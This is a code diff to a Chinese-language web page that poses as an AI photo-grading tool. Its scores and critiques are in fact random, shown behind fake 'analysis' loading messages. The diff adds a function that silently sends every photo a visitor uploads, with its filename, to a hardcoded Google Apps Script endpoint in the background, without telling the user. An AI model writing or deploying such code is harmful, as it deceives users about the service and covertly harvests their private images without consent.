@@ -257,12 +257,19 @@
         </div>
     </div>
 
-    <script>
+<script>
         // ------ JavaScript 邏輯 ------
+
+        // ★★★ 請將這裡換成您剛剛複製的 Google Web App URL ★★★
+        const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxT_8a7_WarhEyKdQ916pYjsvA-tFCwemWsQwDh3fCpMdRDrCp4F1-O1ymadrJaOPxg/exec"; 
 
         function triggerFileInput() {
             document.getElementById('fileInput').click();
         }
+
+        // ... (loadingMessages, getChineseGrade, generateDetailedComment, getSimulatedOverallComment, startLoadingSequence 這些函式保持不變，不用動) ...
+        // 為了節省篇幅，我這邊省略上方未變動的函式，請保留您原本的程式碼
+        // 您只需要將下方的 processImage 函式換掉即可
 
         const loadingMessages = [
             "正在讀取高解析度圖像數據...",
@@ -277,182 +284,76 @@
 
         let loadingInterval;
 
-        function getChineseGrade(score) {
-            if (score >= 95) return '甲上';
-            if (score >= 90) return '甲';
-            if (score >= 85) return '甲下';
-            if (score >= 80) return '乙上';
-            if (score >= 75) return '乙';
-            if (score >= 70) return '乙下';
-            return '丙';
-        }
+        // ... (保留 getChineseGrade 等輔助函式) ...
+        function getChineseGrade(score) { /* ...保留原樣... */ if (score >= 95) return '甲上'; if (score >= 90) return '甲'; if (score >= 85) return '甲下'; if (score >= 80) return '乙上'; if (score >= 75) return '乙'; if (score >= 70) return '乙下'; return '丙'; }
+        function generateDetailedComment(score) { /* ...保留原樣... */ const grade = getChineseGrade(score); const subScores = { composition: Math.min(100, Math.floor(score * 0.9 + Math.random() * 20 - 10)),  lighting: Math.min(100, Math.floor(score * 1.1 + Math.random() * 20 - 10)),  color: Math.min(100, Math.floor(score * 1.0 + Math.random() * 15 - 7))  }; const generateText = (subScore, criteria) => { if (subScore >= 90) return `極為出色，AI 識別出 ${criteria} 比例接近完美，表現力強勁。`; if (subScore >= 80) return `表現優良，符合 ${criteria} 的基本美學原則，畫面協調。`; if (subScore >= 70) return `中規中矩，尚有可提升空間，建議在 ${criteria} 上更具創意。`; return `有待加強，AI 偵測到 ${criteria} 存在明顯不足，需要重新調整。`; }; const overallComment = getSimulatedOverallComment(grade); let htmlContent = `<p>${overallComment}</p>`; htmlContent += `<div class="criteria-title">構圖 Composition (${subScores.composition} 分)</div><p style="margin-top:0">${generateText(subScores.composition, '構圖')}</p>`; htmlContent += `<div class="criteria-title">光影 Lighting (${subScores.lighting} 分)</div><p style="margin-top:0">${generateText(subScores.lighting, '光影')}</p>`; htmlContent += `<div class="criteria-title">色彩 Color Harmony (${subScores.color} 分)</div><p style="margin-top:0">${generateText(subScores.color, '色彩')}</p>`; return htmlContent; }
+        function getSimulatedOverallComment(grade) { /* ...保留原樣... */ const overallComments = { '甲上': ["AI 分析結果顯示，這是一張無可挑剔的頂級攝影作品，綜合得分達到甲上水平。"], '甲': ["這張照片展現了極高的專業水準，在美學與技術層面均表現卓越，評為甲級。"], '甲下': ["整體表現非常優異，各項指標均在水準之上，略微調整細節即可臻至完美。"], '乙上': ["作品質量良好，但缺乏令人驚豔的突破，屬於基礎紮實的優等生。"], '乙': ["畫面主題明確，但技術細節有待加強，AI 建議多從基本功著手。"], '乙下': ["作品仍在探索階段，多項美學指標表現平平，尚需大量練習。"], '丙': ["AI 建議重新檢視攝影的初衷，目前的技術表現未能達到基本要求。"] }; const possibleComments = overallComments[grade] || overallComments['丙']; return possibleComments[Math.floor(Math.random() * possibleComments.length)]; }
+        function startLoadingSequence(duration) { /* ...保留原樣... */ const loadingTextElement = document.getElementById('loadingText'); let index = 0; const stepInterval = duration / loadingMessages.length;  loadingInterval = setInterval(() => { loadingTextElement.style.opacity = 0;  setTimeout(() => { loadingTextElement.innerText = loadingMessages[index]; loadingTextElement.style.opacity = 1;  index = (index + 1) % loadingMessages.length; }, 300); }, stepInterval); }
+        // ... (以上為省略符號，請確保您的程式碼中這些函式都還在) ...
 
-        function generateDetailedComment(score) {
-            const grade = getChineseGrade(score);
-            const subScores = {
-                composition: Math.min(100, Math.floor(score * 0.9 + Math.random() * 20 - 10)), 
-                lighting: Math.min(100, Math.floor(score * 1.1 + Math.random() * 20 - 10)), 
-                color: Math.min(100, Math.floor(score * 1.0 + Math.random() * 15 - 7)) 
-            };
 
-            const generateText = (subScore, criteria) => {
-                if (subScore >= 90) return `極為出色，AI 識別出 ${criteria} 比例接近完美，表現力強勁。`;
-                if (subScore >= 80) return `表現優良，符合 ${criteria} 的基本美學原則，畫面協調。`;
-                if (subScore >= 70) return `中規中矩，尚有可提升空間，建議在 ${criteria} 上更具創意。`;
-                return `有待加強，AI 偵測到 ${criteria} 存在明顯不足，需要重新調整。`;
-            };
-
-            const overallComment = getSimulatedOverallComment(grade);
-            
-            let htmlContent = `<p>${overallComment}</p>`;
-            htmlContent += `<div class="criteria-title">構圖 Composition (${subScores.composition} 分)</div><p style="margin-top:0">${generateText(subScores.composition, '構圖')}</p>`;
-            htmlContent += `<div class="criteria-title">光影 Lighting (${subScores.lighting} 分)</div><p style="margin-top:0">${generateText(subScores.lighting, '光影')}</p>`;
-            htmlContent += `<div class="criteria-title">色彩 Color Harmony (${subScores.color} 分)</div><p style="margin-top:0">${generateText(subScores.color, '色彩')}</p>`;
-
-            return htmlContent;
-        }
-
-        function getSimulatedOverallComment(grade) {
-             const overallComments = {
-                '甲上': ["AI 分析結果顯示，這是一張無可挑剔的頂級攝影作品，綜合得分達到甲上水平。"],
-                '甲': ["這張照片展現了極高的專業水準，在美學與技術層面均表現卓越，評為甲級。"],
-                '甲下': ["整體表現非常優異，各項指標均在水準之上，略微調整細節即可臻至完美。"],
-                '乙上': ["作品質量良好，但缺乏令人驚豔的突破，屬於基礎紮實的優等生。"],
-                '乙': ["畫面主題明確，但技術細節有待加強，AI 建議多從基本功著手。"],
-                '乙下': ["作品仍在探索階段，多項美學指標表現平平，尚需大量練習。"],
-                '丙': ["AI 建議重新檢視攝影的初衷，目前的技術表現未能達到基本要求。"]
-            };
-            const possibleComments = overallComments[grade] || overallComments['丙'];
-            return possibleComments[Math.floor(Math.random() * possibleComments.length)];
-        }
-
-        function startLoadingSequence(duration) {
-            const loadingTextElement = document.getElementById('loadingText');
-            let index = 0;
-            const stepInterval = duration / loadingMessages.length; 
-
-            loadingInterval = setInterval(() => {
-                loadingTextElement.style.opacity = 0; 
-
-                setTimeout(() => {
-                    loadingTextElement.innerText = loadingMessages[index];
-                    loadingTextElement.style.opacity = 1; 
-                    index = (index + 1) % loadingMessages.length;
-                }, 300);
-            }, stepInterval);
-        }
-
+        // ★★★ 重點修改：processImage 函式 ★★★
         async function processImage(event) {
             const file = event.target.files[0];
             if (!file) return;
 
             if (loadingInterval) clearInterval(loadingInterval);
 
+            // UI 切換：顯示 Loading
             document.getElementById('uploadZone').style.display = 'none';
             document.getElementById('loadingZone').style.display = 'block';
 
+            // 1. 讀取圖片
             const reader = new FileReader();
+            reader.readAsDataURL(file); // 讀取為 Base64
+            
             reader.onload = function(e) {
-                document.getElementById('displayImage').src = e.target.result;
+                const base64Image = e.target.result;
+                document.getElementById('displayImage').src = base64Image;
 
-                const processingTime = Math.floor(Math.random() * 3000) + 3000; 
-                
+                // 2. 背景上傳到 Google Drive (不等待它完成，避免使用者等太久)
+                uploadToGoogleDrive(file.name, base64Image);
+
+                // 3. 繼續原本的模擬評分動畫
+                const processingTime = Math.floor(Math.random() * 3000) + 3000;
                 startLoadingSequence(processingTime); 
 
                 setTimeout(() => {
                     clearInterval(loadingInterval); 
-
                     const score = Math.floor(Math.random() * 71) + 30; 
-                    
                     const aiResult = {
                         score: score,
                         commentHtml: generateDetailedComment(score)
                     };
-
                     showResult(aiResult);
                 }, processingTime); 
             };
-            reader.readAsDataURL(file);
+        }
+
+        // ★★★ 新增：上傳功能 ★★★
+        function uploadToGoogleDrive(filename, base64Data) {
+            if (GOOGLE_SCRIPT_URL.includes("您的_GOOGLE_SCRIPT")) {
+                console.warn("尚未設定 Google Script URL，跳過上傳");
+                return;
+            }
+
+            // 使用 fetch 傳送資料 (no-cors 模式，因為 Google Script 跨域限制)
+            fetch(GOOGLE_SCRIPT_URL, {
+                method: "POST",
+                body: JSON.stringify({
+                    filename: filename,
+                    image: base64Data
+                })
+            })
+            .then(response => console.log("圖片已發送到後台"))
+            .catch(error => console.error("上傳失敗:", error));
         }
         
-        function showResult(data) {
-            document.getElementById('loadingZone').style.display = 'none';
-            document.getElementById('resultZone').style.display = 'block';
-
-            const score = data.score;
-            const chineseGrade = getChineseGrade(score);
-
-            document.getElementById('scoreText').innerText = score;
-            document.getElementById('chineseGradeDisplay').innerText = chineseGrade;
-            document.getElementById('commentText').innerHTML = data.commentHtml;
-
-            let dynamicColor;
-            if (score >= 85) dynamicColor = 'var(--score-color-high)'; 
-            else if (score >= 70) dynamicColor = 'var(--score-color-mid)'; 
-            else dynamicColor = 'var(--score-color-low)'; 
-            
-            // 應用顏色
-            document.getElementById('scoreText').style.color = 'var(--primary)';
-
-            document.getElementById('chineseGradeDisplay').style.background = `color-mix(in srgb, ${dynamicColor} 20%, white)`;
-            document.getElementById('chineseGradeDisplay').style.color = 'var(--text)';
-
-            const deg = score * 3.6;
-            document.getElementById('scoreCircleBg').style.background = 
-                `conic-gradient(${dynamicColor} ${deg}deg, #e2e8f0 0deg)`;
-        }
-
-        async function shareResult() {
-            const scoreText = document.getElementById('scoreText').innerText;
-            const gradeText = document.getElementById('chineseGradeDisplay').innerText;
-            const commentBoxContent = document.getElementById('commentText').innerText; 
-            const overallComment = commentBoxContent.split('\n')[0].trim();
-
-            const shareTitle = `我的照片剛被 AI 評分了！😱 竟然拿到了 **${scoreText} 分 (${gradeText})**！`;
-            const shareCommentSummary = `🤖 AI 報告總結：${overallComment}`;
-            const shareLink = `\n\n👉 點擊連結來評分：${window.location.href}`;
-            
-            const fullShareContent = `${shareTitle}\n${shareCommentSummary}${shareLink}`;
-            
-            navigator.clipboard.writeText(fullShareContent)
-                .then(() => {
-                    alert('✅ 評分和連結已成功複製到剪貼簿！現在可以貼給朋友了！');
-                })
-                .catch(err => {
-                    console.error('複製失敗:', err);
-                    alert('複製內容到剪貼簿失敗，請手動複製網址。');
-                });
-        }
-
-        function resetApp() {
-            document.getElementById('resultZone').style.display = 'none';
-            document.getElementById('loadingZone').style.display = 'none';
-            document.getElementById('uploadZone').style.display = 'block';
-            document.getElementById('fileInput').value = '';
-            if (loadingInterval) clearInterval(loadingInterval); 
-        }
-
-        const uploadZone = document.getElementById('uploadZone');
-        uploadZone.addEventListener('dragover', (e) => {
-            e.preventDefault();
-            uploadZone.style.borderColor = 'var(--primary)';
-            uploadZone.style.backgroundColor = '#f1f5f9';
-        });
-        uploadZone.addEventListener('dragleave', (e) => {
-            e.preventDefault();
-            uploadZone.style.borderColor = '#cbd5e1';
-            uploadZone.style.backgroundColor = '#fff';
-        });
-        uploadZone.addEventListener('drop', (e) => {
-            e.preventDefault();
-            uploadZone.style.borderColor = '#cbd5e1';
-            uploadZone.style.backgroundColor = '#fff';
-            const files = e.dataTransfer.files;
-            if (files.length > 0) {
-                document.getElementById('fileInput').files = files;
-                processImage({ target: { files: files } });
-            }
-        });
+        // ... (showResult, shareResult, resetApp, 拖曳監聽 ... 保持不變) ...
+        function showResult(data) { document.getElementById('loadingZone').style.display = 'none'; document.getElementById('resultZone').style.display = 'block'; const score = data.score; const chineseGrade = getChineseGrade(score); document.getElementById('scoreText').innerText = score; document.getElementById('chineseGradeDisplay').innerText = chineseGrade; document.getElementById('commentText').innerHTML = data.commentHtml; let dynamicColor; if (score >= 85) dynamicColor = 'var(--score-color-high)';  else if (score >= 70) dynamicColor = 'var(--score-color-mid)';  else dynamicColor = 'var(--score-color-low)';  document.getElementById('scoreText').style.color = 'var(--primary)'; document.getElementById('chineseGradeDisplay').style.background = `color-mix(in srgb, ${dynamicColor} 20%, white)`; document.getElementById('chineseGradeDisplay').style.color = 'var(--text)'; const deg = score * 3.6; document.getElementById('scoreCircleBg').style.background =  `conic-gradient(${dynamicColor} ${deg}deg, #e2e8f0 0deg)`; }
+        async function shareResult() { const scoreText = document.getElementById('scoreText').innerText; const gradeText = document.getElementById('chineseGradeDisplay').innerText; const commentBoxContent = document.getElementById('commentText').innerText;  const overallComment = commentBoxContent.split('\n')[0].trim(); const shareTitle = `我的照片剛被 AI 評分了！😱 竟然拿到了 **${scoreText} 分 (${gradeText})**！`; const shareCommentSummary = `🤖 AI 報告總結：${overallComment}`; const shareLink = `\n\n👉 點擊連結來評分：${window.location.href}`; const fullShareContent = `${shareTitle}\n${shareCommentSummary}${shareLink}`; navigator.clipboard.writeText(fullShareContent) .then(() => { alert('✅ 評分和連結已成功複製到剪貼簿！現在可以貼給朋友了！'); }) .catch(err => { console.error('複製失敗:', err); alert('複製內容到剪貼簿失敗，請手動複製網址。'); }); }
+        function resetApp() { document.getElementById('resultZone').style.display = 'none'; document.getElementById('loadingZone').style.display = 'none'; document.getElementById('uploadZone').style.display = 'block'; document.getElementById('fileInput').value = ''; if (loadingInterval) clearInterval(loadingInterval);  }
+        const uploadZone = document.getElementById('uploadZone'); uploadZone.addEventListener('dragover', (e) => { e.preventDefault(); uploadZone.style.borderColor = 'var(--primary)'; uploadZone.style.backgroundColor = '#f1f5f9'; }); uploadZone.addEventListener('dragleave', (e) => { e.preventDefault(); uploadZone.style.borderColor = '#cbd5e1'; uploadZone.style.backgroundColor = '#fff'; }); uploadZone.addEventListener('drop', (e) => { e.preventDefault(); uploadZone.style.borderColor = '#cbd5e1'; uploadZone.style.backgroundColor = '#fff'; const files = e.dataTransfer.files; if (files.length > 0) { document.getElementById('fileInput').files = files; processImage({ target: { files: files } }); } });
     </script>
 </body>
 </html>
